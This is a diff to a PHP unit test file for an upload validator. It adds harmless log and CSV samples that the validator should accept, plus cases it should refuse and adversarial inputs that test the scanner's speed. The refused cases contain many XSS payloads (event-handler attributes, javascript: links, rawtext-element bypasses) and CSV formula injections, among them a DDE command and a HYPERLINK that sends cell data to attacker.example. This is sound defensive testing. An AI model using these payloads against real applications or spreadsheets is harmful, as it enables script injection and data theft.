@@ -55,6 +55,18 @@ final class PanelAttachmentsTest extends TestCase
             'csv with a pipe in a cell' => ['data.csv', 'text/csv', "a,b\nfoo|bar,2\n"],
             'csv with an email' => ['data.csv', 'text/csv', "who,mail\nbob,bob@example.com\n"],
             'txt that mentions a script tag word' => ['a.txt', 'text/plain', 'the word script alone is fine'],
+            'csv with quoted ordinary cells' => ['data.csv', 'text/csv', "name,note\n\"Smith, Bob\",\"said \"\"hi\"\"\"\n"],
+            // CR6: ordinary logs and text that happen to contain angle brackets
+            'mail log with an address' => ['mail.log', 'text/plain', "From: Bob Smith <bob@example.com>\nTo: <ann@example.org>\n"],
+            'dir listing' => ['dir.txt', 'text/plain', "11/15/2026  10:00 AM    <DIR>          Documents\n"],
+            'python traceback' => ['trace.log', 'text/plain', "Traceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\n"],
+            'java stack trace' => ['java.log', 'text/plain', "at java.util.ArrayList.<init>(ArrayList.java:1)\nat Foo.<clinit>(Foo.java:3)\n"],
+            'txt starting with a quote' => ['quote.txt', 'text/plain', "\"- this is a quote\" she said\n"],
+            'angle brackets around a level' => ['app.log', 'text/plain', "<info> started\n<error> src=foo failed\n"],
+            'key=value log with quoted values and angle brackets (CRR-17)' => ['kv.log', 'text/plain', "ts=1 msg=\"a > b\" user=\"x\" level=<warn> host=h1 note='it''s fine'\n"],
+            'a tag with thousands of quoted attributes and no handler (CRR-17)' => ['big.log', 'text/plain', '<x ' . str_repeat('k="v" ', 4000) . ">\n"],
+            'many quoted pairs without a handler (CRR-17)' => ['many.log', 'text/plain', str_repeat('k="v" ', 4000) . "\n"],
+            'txt that compares numbers' => ['a.txt', 'text/plain', 'if a < 3 and b > 2 then'],
             'txt with a bom' => ['a.txt', 'text/plain', "\xEF\xBB\xBFhello"],
             'name that merely contains a device name' => ['console.png', 'image/png', self::PNG],
             'name with a dash inside' => ['my-file.png', 'image/png', self::PNG],
@@ -123,6 +135,64 @@ final class PanelAttachmentsTest extends TestCase
             'csv formula in a later cell' => ['a.csv', 'text/csv', "name,value\nbob,=1+1"],
             'csv dde on a later line' => ['a.csv', 'text/csv', "name,value\nbob,+cmd|' /C calc'!A0"],
             'script after the first 8 KiB' => ['a.txt', 'text/plain', str_repeat('x', 9000) . '<script>alert(1)</script>'],
+            // CORE-DS-32: markup that is not on a name list
+            'img onerror in text' => ['a.txt', 'text/plain', 'intro <img src=x onerror=alert(1)>'],
+            'body onload in a log' => ['a.log', 'text/plain', '<body onload=alert(1)>'],
+            'closing tag in text' => ['a.txt', 'text/plain', 'x </a> y'],
+            'comment in csv' => ['a.csv', 'text/csv', "a,b\n<!-- x -->,2"],
+            // CORE-DS-33: a quoted cell is the same formula to a spreadsheet
+            'csv quoted hyperlink' => ['a.csv', 'text/csv', "name,value\nx,\"=HYPERLINK(\"\"http://attacker.example/?\"\"&A1,\"\"Click\"\")\"\n"],
+            'csv quoted dde' => ['a.csv', 'text/csv', "name,value\nx,\"=cmd|' /C calc'!A0\"\n"],
+            'csv quoted at function' => ['a.csv', 'text/csv', "a,\"@SUM(1+1)*cmd|x\"\n"],
+            'csv quoted first cell' => ['a.csv', 'text/csv', "\"=1+1\",b\n"],
+            'csv quoted plus call after spaces' => ['a.csv', 'text/csv', "a, \" +SUM(1,2)\"\n"],
+            'img with a space after the name' => ['a.txt', 'text/plain', "x\n<IMG SRC=javascript:alert(1)>"],
+            'slash separated handler' => ['a.txt', 'text/plain', '<x/onclick=alert(1)>'],
+            'slash separated handler on a div' => ['a.log', 'text/plain', 'before <div/onmouseover=alert(1)> after'],
+            'quoted greater-than before the handler (CRR-17)' => ['a.txt', 'text/plain', '<x title=">" onmouseover=alert(1)>'],
+            'quoted less-than before the handler (CRR-17)' => ['a.txt', 'text/plain', '<x title="<" onclick=alert(1)>'],
+            'single quoted value before the handler (CRR-17)' => ['a.txt', 'text/plain', "<x title='>' onfocus=alert(1)>"],
+            'dot in the tag name (CRR-17)' => ['a.txt', 'text/plain', '<x.y onclick=alert(1)>'],
+            'colon and digit in the tag name (CRR-17)' => ['a.txt', 'text/plain', '<svg:a1 onload=alert(1)>'],
+            'rawtext element hides a handler: xmp (R6-1)' => ['a.txt', 'text/plain', '<xmp><x title="</xmp><y onclick=alert(1)>">'],
+            'rawtext element hides a handler: xmp single quote (R6-1)' => ['a.txt', 'text/plain', "<xmp><x title='</xmp><y onclick=alert(1)>'>"],
+            'rawtext element hides a handler: noembed (R6-1)' => ['a.txt', 'text/plain', '<noembed><x title="</noembed><y onclick=alert(1)>">'],
+            'rawtext element hides a handler: noframes (R6-1)' => ['a.txt', 'text/plain', "<noframes><x title='</noframes><y onclick=alert(1)>'>"],
+            'rawtext element hides a handler: plaintext (R6-1)' => ['a.txt', 'text/plain', '<plaintext><x title="<y onclick=alert(1)>">'],
+            'rawtext element hides a handler: iframe (R6-1)' => ['a.txt', 'text/plain', '<iframe><x title="</iframe><y onclick=alert(1)>">'],
+            'rawtext element hides a handler: noscript (R6-1)' => ['a.txt', 'text/plain', "<noscript><x title='</noscript><y onclick=alert(1)>'>"],
+            'rawtext element hides a handler: textarea (R6-1)' => ['a.txt', 'text/plain', '<textarea><x title="</textarea><y onclick=alert(1)>">'],
+            'rawtext element hides a handler: title (R6-1)' => ['a.txt', 'text/plain', '<title><x a="</title><y onclick=alert(1)>">'],
+            'rawtext element hides a handler: style (R6-1)' => ['a.txt', 'text/plain', '<style><x a="</style><y onclick=alert(1)>">'],
+            'rawtext element hides a handler: script (R6-1)' => ['a.txt', 'text/plain', '<script><x a="</script><y onclick=alert(1)>">'],
+            'tag start inside a quoted value (R5-1 review)' => ['a.txt', 'text/plain', '<x title="<b onclick=1>'],
+            'tag inside a closed quoted value (R5-1 review)' => ['a.txt', 'text/plain', '<x b="1<img onerror=x>">'],
+            'tag inside a single quoted value (R5-1 review)' => ['a.txt', 'text/plain', "<x b='1<svg onload=x>'>"],
+            'unterminated quote then a handler (R5-1 review)' => ['a.txt', 'text/plain', '<x a="b onclick=1>'],
+            'unterminated single quote then a handler (R5-1 review)' => ['a.txt', 'text/plain', "<x a='b onclick=1>"],
+            'unterminated quote with a later tag (R5-1 review)' => ['a.txt', 'text/plain', "<x a=\"b\n<y onclick=1>"],
+            'space after the bracket, handler (R5-1 review)' => ['a.txt', 'text/plain', '< x onclick=1>'],
+            'less-than then a digit inside the tag (R5-1)' => ['a.txt', 'text/plain', '<x <1 onclick=1>'],
+            'less-than inside an attribute name (R5-1)' => ['a.txt', 'text/plain', '<x a<1 onclick=1>'],
+            'less-than glued to the tag name (R5-1)' => ['a.txt', 'text/plain', '<x<y onclick=1>'],
+            'quote in the tag name (CRR-17)' => ['a.txt', 'text/plain', '<x"y onclick=alert(1)>'],
+            'apostrophe in the tag name (CRR-17)' => ['a.txt', 'text/plain', "<x'y onclick=alert(1)>"],
+            'equals sign in the tag name (CRR-17)' => ['a.txt', 'text/plain', '<x=y onclick=alert(1)>'],
+            'stray apostrophe in an unquoted value (CRR-17)' => ['a.txt', 'text/plain', "<x data=it's onclick=alert(1)>"],
+            'stray quote in an attribute name (CRR-17)' => ['a.txt', 'text/plain', '<x a"b onclick=alert(1)>'],
+            'quote that closes after the handler (CRR-17)' => ['a.txt', 'text/plain', "<x a=b onclick=alert(1) c='d'>"],
+            'earlier regression: slash then handler' => ['a.txt', 'text/plain', '<img/src=x onerror=alert(1)>'],
+            'earlier regression: newline separator' => ['a.txt', 'text/plain', "<x\nonclick=alert(1)>"],
+            'earlier regression: handler after other attributes' => ['a.txt', 'text/plain', '<x class=a id=b onfocus=alert(1) autofocus>'],
+            'earlier regression: href with a space before the colon-free name' => ['a.txt', 'text/plain', '<x data-a=1 href=javascript:alert(1)>'],
+            'earlier regression: uppercase' => ['a.txt', 'text/plain', '<X ONCLICK=alert(1)>'],
+            'earlier regression: space after the bracket' => ['a.txt', 'text/plain', '< x onclick=alert(1)>'],
+            'tab separated (CRR-17)' => ['a.txt', 'text/plain', "<x\tonclick=alert(1)>"],
+            'slash then spaces then handler' => ['a.txt', 'text/plain', '<foo / onfocus=alert(1) autofocus>'],
+            'quoted attribute after a slash' => ['a.txt', 'text/plain', '<p/style="x:expression(alert(1))">'],
+            'svg onload' => ['a.log', 'text/plain', '<svg/onload=alert(1)>'],
+            'anchor with href' => ['a.txt', 'text/plain', 'see <a href="javascript:alert(1)">here</a>'],
+            'unknown tag with a handler' => ['a.txt', 'text/plain', '<x-foo onclick=alert(1)>'],
             'device name' => ['CON.png', 'image/png', self::PNG],
             'device name lower case with extension' => ['nul.txt', 'text/plain', 'hello'],
             'device name with spaces before the dot' => ['con .txt', 'text/plain', 'hello'],
@@ -137,6 +207,73 @@ final class PanelAttachmentsTest extends TestCase
     public function testRefuses(string $name, string $type, string $bytes): void
     {
         $this->rejected([self::att($name, $type, $bytes)]);
+    }
+
+    /**
+     * R5-1 / R6-2: the scan for active attributes is linear in the size of the file and bounded by a step budget. Adversarial files of the largest default size (5 MiB) in several shapes
+     * are decided, and the verdict of each is asserted. The time bound is generous on purpose (a CI runner is several times slower than a workstation): the quadratic version needed minutes for a tenth of this size, so a bound of seconds still catches it, and what the test pins down is the verdict and the step budget. Every input starts with a `href=` that is not in a tag, so the prefilter lets it through and the
+     * tokenizer really runs (a file without any candidate attribute name never reaches it).
+     *
+     * @return array<string,array{string,bool}> bytes, whether the file is refused
+     */
+    public static function adversarial(): array
+    {
+        $size = 5 * 1024 * 1024 - 64;
+        $fill = static fn (string $unit): string => "href=1\n" . substr(str_repeat($unit, intdiv($size, strlen($unit)) + 1), 0, $size);
+
+        return [
+            // more markup than the budget allows: refused
+            'repeated unterminated tags' => [$fill('<x a=b'), true],
+            'repeated unterminated tags with a space' => [$fill('<x a=b '), true],
+            'candidate attribute names, no handler value' => [$fill('<x data-src b '), true],
+            'candidate names with quoted values' => [$fill('<x srcset="a" b=c '), true],
+            'handler-like names that are not attributes' => [$fill('<x a=b onx'), true],
+            'quote led' => [$fill('<x "a=b '), true],
+            'less-than inside the tag' => [$fill('<x <1 '), true],
+            'closed quotes without a handler' => [$fill('<x a="b" '), true],
+            'equals signs' => [$fill('<x ='), true],
+            'slashes' => [$fill('<x /'), true],
+            'a handler at the very end' => [$fill('<x a=b ') . '<x onclick=1>', true],
+            // refused because a quote is never closed
+            'unterminated quotes' => [$fill('<x a="'), true],
+            'unterminated single quotes' => [$fill("<x a='"), true],
+            // little markup: decided on what it says (accepted)
+            'tag names without white space' => [$fill('<x'), false],
+            'less-than runs' => [$fill('<'), false],
+            'less-than and spaces' => [$fill('<   '), false],
+            'long attribute name' => ["href=1\n<x " . str_repeat('a', $size - 10) . '=1>', false],
+        ];
+    }
+
+    #[DataProvider('adversarial')]
+    public function testTheActiveMarkupScanIsLinearAndDecidesEachShape(string $bytes, bool $refused): void
+    {
+        $scan = new \ReflectionMethod(PanelAttachments::class, 'hasActiveAttribute');
+        $t = hrtime(true);
+        $verdict = $scan->invoke(null, $bytes);
+        $ms = (hrtime(true) - $t) / 1e6;
+        $this->assertSame($refused, $verdict, 'the tokenizer verdict');
+        $this->assertLessThan(20000, $ms, 'took ' . round($ms) . ' ms for ' . strlen($bytes) . ' bytes');
+        // and through the whole validation: the same verdict, in the same time
+        $t = hrtime(true);
+        $threw = false;
+        try {
+            PanelAttachments::validate([self::att('big.txt', 'text/plain', $bytes)], new PanelLimits());
+        } catch (ApiError) {
+            $threw = true;
+        }
+        $this->assertSame($refused, $threw, 'validate() agrees');
+        $this->assertLessThan(20000, (hrtime(true) - $t) / 1e6);
+    }
+
+    /** R6-2: running out of the step budget refuses the file (it cannot happen by accident at the real budget; a small one is injected to reach the branch). */
+    public function testRunningOutOfTheStepBudgetRefusesTheFile(): void
+    {
+        $scan = new \ReflectionMethod(PanelAttachments::class, 'hasActiveAttribute');
+        $text = "href=1\n" . str_repeat('<x b=c ', 50);
+        $this->assertFalse($scan->invoke(null, $text), 'at the real budget: fifty harmless tags are fine');
+        $this->assertTrue($scan->invoke(null, $text, 5), 'with a budget of five steps the scan gives up and refuses');
+        $this->assertFalse($scan->invoke(null, "href=1\n<x b=c>", 5), 'a budget that is enough does not');
     }
 
     public function testShapeErrors(): void
